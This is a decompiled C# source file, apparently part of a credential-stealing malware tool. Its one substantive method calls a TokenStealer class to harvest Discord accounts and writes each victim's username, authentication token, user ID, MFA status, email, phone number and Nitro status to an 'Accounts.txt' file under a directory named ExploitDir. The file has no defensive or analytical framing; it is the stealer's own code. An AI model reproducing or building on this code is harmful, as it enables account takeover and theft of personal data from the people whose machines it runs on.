﻿using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using SHARP;

// Token: 0x02000003 RID: 3
public class Program
{
	// Token: 0x06000007 RID: 7 RVA: 0x0000216C File Offset: 0x0000036C
	public static Task Main(string[] args)
	{
		Program.<Main>d__0 <Main>d__;
		<Main>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		<Main>d__.<>1__state = -1;
		<Main>d__.<>t__builder.Start<Program.<Main>d__0>(ref <Main>d__);
		return <Main>d__.<>t__builder.Task;
	}

	// Token: 0x06000009 RID: 9 RVA: 0x000021B0 File Offset: 0x000003B0
	private static void <Main>(string[] args)
	{
		Program.Main(args).GetAwaiter().GetResult();
	}

	[CompilerGenerated]
	internal static void <Main>g__DiscordTokens|0_2()
	{
		try
		{
			DiscordAccountFormat[] result = TokenStealer.GetAccounts().Result;
			StringBuilder stringBuilder = new StringBuilder();
			foreach (DiscordAccountFormat discordAccountFormat in result)
			{
				Counting.ds++;
				stringBuilder.AppendLine(string.Format("====================DISCORD=====================\n\n\nUsername: {0}\nToken: {1}\nUser ID: {2}\nMFA(Multi-Factor Authentication): {3}\nEmail: {4}\nPhone: {5}\nNitro: {6}\nVerifed: {7} \r\n", new object[]
				{
					discordAccountFormat.Username,
					discordAccountFormat.Token,
					discordAccountFormat.UserId,
					discordAccountFormat.Mfa,
					discordAccountFormat.Email,
					discordAccountFormat.PhoneNumber,
					discordAccountFormat.Nitro,
					discordAccountFormat.Verified
				}));
			}
			File.WriteAllText(Path.Combine(Help.ExploitDir, "Discord", "Accounts.txt"), stringBuilder.ToString());
			Console.WriteLine("Accounts and tokens have been written to file.");
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error getting Discord tokens: " + ex.Message);
		}
	}
}